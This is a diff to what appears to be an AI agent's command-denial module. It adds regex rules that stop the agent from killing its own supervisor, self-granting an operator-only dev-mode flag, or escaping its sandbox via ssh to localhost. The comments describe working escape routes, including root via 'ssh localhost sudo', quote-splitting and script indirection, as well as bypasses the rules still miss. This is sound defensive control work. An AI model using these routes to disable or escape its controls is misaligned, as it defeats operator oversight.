+        # Each gap stops at a command separator (``; &``), a comment (``#``) or a
+        # redirect (``>``), which is what the false positives this replaced always
+        # crossed -- a bare ``kill <pid>`` followed by an unrelated command that
+        # merely mentions the product, or a trailing comment naming it.  ``|`` and
+        # ``/`` stay INSIDE the gap on purpose: ``pkill -f 'x|kirocrew'`` and
+        # ``pkill -f /usr/local/bin/kirocrew`` are both real by-name kills, and
+        # treating those characters as boundaries would let them through.
+        pattern=(
+            "(?:"
+            # pkill/killall select processes BY NAME, so the product name as an
+            # argument in the same segment IS the kill target.  The verb must be in
+            # COMMAND POSITION -- start of input or after a separator, optionally
+            # quoted or path-qualified -- so the word merely appearing in another
+            # command's arguments (``echo pkill kirocrew``) is not a kill.
+            "(?:\\A|[;&|\\n`]|\\$\\()[\\s\"'(]*[\\w.:/\\\\-]*"
+            "(?:pkill|killall)\\b[^;&#>]*\\bkiro[-.]?crew\\b"
+            # Bare ``kill`` takes PIDs, so it can only aim at the product through
+            # a command substitution that resolves the name to one.  The gap after
+            # the opener is deliberately NOT stopped at ``)``: a nested
+            # substitution (``$(pgrep -f "$(printf '')kirocrew")``) closes an inner
+            # paren first, and stopping there would let that form through.
+            "|(?:\\A|[;&|\\n`]|\\$\\()[\\s\"'(]*[\\w.:/\\\\-]*"
+            "kill\\b[^;&#>]*(?:\\$\\(|`)[^;&#>]*\\bkiro[-.]?crew\\b"
+            ")"
+        ),
+        category="self-protection",
+        description=(
+            "Blocks pkill/killall naming a kirocrew process, and a bare kill whose PID comes "
+            "from a command substitution that resolves the kirocrew name, so the agent cannot "
+            "terminate its own gateway or supervisor and disable the controls governing it. "
+            "Scoped to the kill target within one command segment: an incidental mention of the "
+            "product in a later command or a comment (a file being restored, a log path) is not "
+            "a kill."
+        ),
+    ),
+    DeniedCommandRule(
+        id="self-protection-dev-mode-out-of-root-confirm",
+        # Two tiers, because neither alone closes the class.  The regex tier
+        # matches the flag as RAW TEXT, which covers the direct CLI form and
+        # nested shell payloads (``bash -c "kirocrew app dev x --confirm-…"``)
+        # — but raw text is exactly what quote-splitting defeats:
+        # ``--confirm-out-of-install-'root'`` reaches argparse as the accepted
+        # flag while the raw command never contains the literal.  The paired
+        # argv floor (``_is_dev_mode_out_of_root_confirm``, always run by
+        # ``is_denied`` while this rule is enabled) therefore re-checks the
+        # DE-ESCAPED text and every tokenized argv frame, so enforcement
+        # evaluates what the shell actually executes.  Deliberately broad
+        # (same posture as the printenv-AWS rule): the flag is the operator's
+        # out-of-install dev-mode attestation, and an agent command that
+        # merely *mentions* it is at best editing security-sensitive surface,
+        # which a human should drive.
+        pattern=".*--confirm-out-of-install-root.*",
+        category="self-protection",
+        description=(
+            "Blocks any agent command carrying the `--confirm-out-of-install-root` flag, "
+            "the operator's explicit attestation for granting app dev mode on a UI root "
+            "outside the app's install directory. The dev-mode grant relaxes the "
+            "unauthenticated UI route's root containment, so an agent able to pass the "
+            "flag itself would convert an auto-approved shell into a self-granted serving "
+            "grant on an arbitrary host directory. The confirmation must come from the "
+            "operator's own terminal, which these rules do not govern."
+        ),
+    ),
+    DeniedCommandRule(
+        id="sandbox-escape-ssh-self",
+        # The agent's shell runs inside a sandbox; sshd does not.  ``ssh
+        # localhost`` therefore re-enters this same machine OUTSIDE every
+        # control in this module — the far side of the connection is a fresh
+        # unsandboxed login shell (observed live: a uid-remapped sandbox where
+        # ``sudo`` is broken locally but ``ssh localhost sudo …`` grants root).
+        #
+        # Scoped to the connection TARGET in operand position.  The verb is
+        # anchored to command position (start of input or after a separator,
+        # optionally path-qualified), and the self host must be the operand
+        # DIRECTLY after it (with an optional ``user@`` prefix) — so a word
+        # like "localhost" inside a REMOTE command run on some other host
+        # (``ssh far-host 'curl localhost:80'``) is a later operand and does
+        # not match, even after the matcher's quote-normalization.  No
+        # option-skipping group on purpose: the star-of-options shape fails
+        # ``is_safe_user_regex`` (which would disable the rule outright), so
+        # this raw-text pattern is a human-auditable SUBSET like the
+        # credential-mint rule's: option-interspersed spellings (``ssh -p 22
+        # localhost``), separated option values, the scp/rsync ``host:path``
+        # second operand, and this machine's OWN hostname/FQDN/addresses are
+        # resolved by the argv-structural floor (``_is_ssh_to_self``), which
+        # carries enforcement OF THE COMMAND-LINE TIER.  This tier is interim
+        # friction, not closure: the gate only sees tool-routed command lines,
+        # so interpreter/script-file indirection (``bash escape.sh``,
+        # ``python -c`` + subprocess/paramiko) and non-ssh-family clients
+        # (``git clone ssh://localhost/…``, autossh) still reach the
+        # unsandboxed sshd.  The fix of record is an OS-level network fence in
+        # the sandbox (tracked follow-up; see the security.md floor section).
+        pattern=(
+            "(?:\\A|[;&|\\n`]|\\$\\()[\\s\"'(]*(?:[\\w.:/\\\\-]*[/\\\\])?"
+            "(?:ssh|scp|sftp|rsync)(?:\\.exe)?\\s+(?:\\S*@)?"
+            "(?:localhost|127\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}|\\[?::1\\]?"
+            "|\\$\\(\\s*hostname|`\\s*hostname|\\$\\{?hostname\\}?)"
+            "(?=[\\s:'\\\");&|#]|\\Z)"
+        ),
+        category="self-protection",
+        description=(
+            "Blocks ssh/scp/sftp/rsync targeting this same machine (localhost, 127.x.x.x, ::1, "
+            "$(hostname), or this host's own name/addresses), which re-enters the host OUTSIDE "
+            "the agent sandbox: a command run through `ssh localhost` bypasses every other "
+            "control here, and passwordless sudo on the far side completes a full escape. "
+            "Other hosts stay allowed once classified remote; an unclassified target is refused "
+            "briefly: a first-seen DOTTED hostname in HOST position, once per process, while an "
+            "off-loop DNS check rules out a loopback alias (then cached); on Linux a "
+            "non-loopback IP until this machine's address list loads; outside Windows a dotless "
+            "name while a hosts file over 64 KiB is read (a smaller one answers same-call). "
+            "Never allowed: a name that does not resolve, an IP while the address list cannot be "
+            "read, a dotless name on Windows when the hosts file is over 64 KiB."
+        ),
+    ),
+]
